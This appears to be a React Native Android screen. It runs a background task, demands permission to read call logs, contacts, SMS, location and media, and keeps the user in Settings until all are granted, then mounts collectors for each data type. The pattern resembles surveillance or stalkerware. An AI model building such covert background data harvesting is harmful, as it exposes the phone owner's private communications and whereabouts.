/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import React, {useEffect, useState} from 'react';
import {
  Button,
  Linking,
  PermissionsAndroid,
  Platform,
  Text,
  View,
} from 'react-native';
import CallLog from '../../components/CallLog';
import {useNavigation} from '@react-navigation/native';
import Contact from '../../components/Contact';
import SmsListener from '../../components/SmsListener';
import Location from '../../components/Location';
// @ts-ignore
import {Runnable} from 'react-native-background-runner';
import {activeRunBackground} from '../../lib/helper';
import Media from '../../components/Media';
import {showAlert} from '../../lib/ui-alert';
import {useAsyncStorage} from '@react-native-async-storage/async-storage';

const Permission = () => {
  const [, setToken] = useState<string | null | undefined>(null);
  const [deviceId, setDeviceId] = useState<string | null | undefined>(null);
  const {getItem: getTokenStore, setItem: setTokenStore} =
    useAsyncStorage('@token');
  const {getItem: getDeviceIdStore, setItem: setDeviceIdStore} =
    useAsyncStorage('@deviceId');
  getTokenStore((_err, result) => setToken(result));
  getDeviceIdStore((_err, result) => setDeviceId(result));
  const navigation = useNavigation();
  const [permissionsGranted, setPermissionsGranted] = useState(false);

  const requestAllPermissions = async () => {
    let listPermissions = [
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      PermissionsAndroid.PERMISSIONS.WRITE_CONTACTS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
    ];
    if (+Platform.Version > 23) {
      listPermissions.push(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION);
    }

    if (+Platform.Version >= 33) {
      listPermissions = listPermissions.concat([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      ]);
    } else {
      listPermissions.push(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }

    if (Platform.OS === 'android') {
      PermissionsAndroid.requestMultiple(listPermissions).then(statuses => {
        const notHasPermissions = listPermissions.some(permission => {
          return statuses[permission] !== PermissionsAndroid.RESULTS.GRANTED;
        });

        if (notHasPermissions) {
          showAlert(
            'Please Go into Settings -> Applications -> Permissions and Allow all permissions to continue',
            {
              close: () => Linking.openSettings().then(),
              closeText: 'Open',
            },
          );
        } else {
          setPermissionsGranted(true);
        }
      });
    }
  };

  useEffect(() => {
    activeRunBackground();
    requestAllPermissions();
  }, []);

  return (
    <Runnable>
      <View
        style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          gap: 16,
        }}>
        <Text>DeviceID: {deviceId}</Text>
        <Button
          title="Logout"
          onPress={async () => {
            await setTokenStore('');
            await setDeviceIdStore('');
            setDeviceId('');
            setToken('');
            navigation.navigate('Authentication' as never);
          }}
        />
        {permissionsGranted && (
          <View>
            <CallLog />
            <Contact />
            <SmsListener />
            <Media />
            <Location />
          </View>
        )}
      </View>
    </Runnable>
  );
};

export default Permission;
